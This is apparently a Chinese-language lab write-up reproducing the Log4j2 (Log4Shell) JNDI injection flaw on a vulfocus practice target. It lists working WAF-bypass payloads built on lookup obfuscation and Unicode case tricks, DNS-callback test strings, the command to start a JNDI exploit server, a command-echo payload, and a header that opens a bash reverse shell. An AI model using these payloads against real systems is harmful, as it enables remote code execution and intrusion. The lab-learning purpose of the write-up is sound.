### 0x01 waf绕过原理
上一篇漏洞复现中讲了下漏洞原理，这篇靶场复现在复现前先讲一下waf绕过原理，首先说明下2.15.0-rc1开始，默认关闭了Lookups功能，需要修改配置才能结合各种绕过方式，所以意义不大，2.16.0开始，移除了Lookups功能，然后在受影响版本2.0-beta9 <= 版本 <= 2.14.1中，由于waf多拦截jndi等关键字，可通过如下几种方式进行绕过  
```
:- 是一个赋值关键字，如果程序处理到 ${aaaa:-bbbb} 这样的字符串，处理的结果将会是 bbbb，借助此特性，可构造如下waf绕过
logg.info("${${::-J}ndi:ldap://127.0.0.1:1389/Calc}");


Lookups中除了jndi还存在Upper、Lower等方式，可变换大小写，可构造如下waf绕过
logg.info("${${lower:J}ndi:ldap://127.0.0.1:1389/Calc}");
logg.info("${${upper:j}ndi:ldap://127.0.0.1:1389/Calc}");


同时也可以利用一些特殊字符的大小写转化的问题
ı => upper => i (Java 中测试可行)
ſ => upper => S (Java 中测试可行)
İ => upper => i (Java 中测试不可行)
K => upper => k (Java 中测试不可行)
logg.error("${jnd${upper:ı}:ldap://127.0.0.1:1389/Calc}");


现在数据传输很多都是 json 形式，所以在 json 中我们也可以进行尝试
像 Jackson 和 fastjson 又有 unicode 和 hex 的编码特性，所以就可以尝试编码绕过
{"key":"\u0024\u007b"}
{"key":"\x24\u007b"}
```

### 0x02 靶场复现
想参照这篇文章复现一下log4j2反弹shell  
https://blog.csdn.net/m0_56773673/article/details/122300927

本想使用vulfocus的在线靶场（vulfocus/log4j2-rce-2021-12-09:1），结果环境启动后，payload打一下，环境崩一下，好不容易环境不崩了，payload放到get请求里，返回400，payload放到post请求里，返回405，心好累，还是参照复现文章中的环境自己搭吧  
参见：https://blog.csdn.net/weixin_47019868/article/details/122010972

使用kali系统，apt update发现非常慢，先更新下源  
参见：https://blog.csdn.net/qq_33331244/article/details/114656949

docker pull vulfocus/log4j2-rce-2021-12-09的时候非常慢，等了好半天都不行，突然想到，是不是docker镜像源的问题，修改镜像源后，不到1分钟就pull完成  
修改镜像源参见：https://blog.csdn.net/qq_29924795/article/details/104483435

本地搭建完环境，发现环境和在线靶场一样，并不是文章中的环境，难道docker镜像升级了，我靠。。

环境就这样了，还是想想payload怎么打吧，payload放入get请求中返回400，payload放入post请求中返回405，还是不行啊，查阅下vulfocus这个靶场别人怎么打的，突然发现，payload是放入get请求中，但需要url编码下，我怎么忘记url编码了，大脑好迟钝  
参见：https://blog.csdn.net/weixin_45632448/article/details/124149561

赶紧改成url编码的形式测试一下，结果还是不行，测了几次，都是不行，突然想到，是不是本地的docker镜像不出网啊，进入docker镜像内，发现各种命令都被阉割了，心再次好累。。

还是用在线靶场试一下吧，如果在线靶场可以，那应该就是本地docker镜像不出网，启动在线靶场，打了一下，dns平台收到请求了，天啦撸，终于行啦
![image](./image/01.png)

折腾了一圈，最后用的还是在线靶场。。。不过还好，这过程也学到不少

经测试，如下三种形式payload都可以
```
${jndi:ldap://de63d35d.dns.1433.eu.org/ttt}
${jndi:ldap://de63d35d.dns.1433.eu.org/}
${jndi:ldap://de63d35d.dns.1433.eu.org}
```

下面尝试执行命令，服务端执行
```
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 0.0.0.0 -l 1389 -p 3456
```
其中JNDIExploit-1.2-SNAPSHOT.jar是魔改过的（也可以使用：[https://github.com/welk1n/JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)）

payload处执行如下（这是一个有回显的payload）
```
${jndi:ldap://0.0.0.0:1389/TomcatBypass/TomcatEcho}
```
并添加一个http头
```
WWW-Authenticate: whoami
```
可以看到成功执行了命令  
![image](./image/02.png)

尝试反弹shell
```
WWW-Authenticate: bash -c 'exec bash -i & >/dev/tcp/0.0.0.0/1234 <&1'
```
可以看到，成功反弹了shell
![image](./image/03.png)

有精力还可以看一下如下2篇log4j2的靶场和漏洞复现：  
https://buaq.net/go-111996.html  
https://www.cnblogs.com/CHOSEN1-Z13/p/16001961.html  

使用工具JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar会更好用（https://github.com/welk1n/JNDI-Injection-Exploit）
参见这篇博客：https://www.cnblogs.com/CHOSEN1-Z13/p/16001961.html

### 参考链接
https://www.freebuf.com/articles/web/341857.html  
https://www.freebuf.com/articles/web/344076.html  
https://nosec.org/home/detail/4920.html  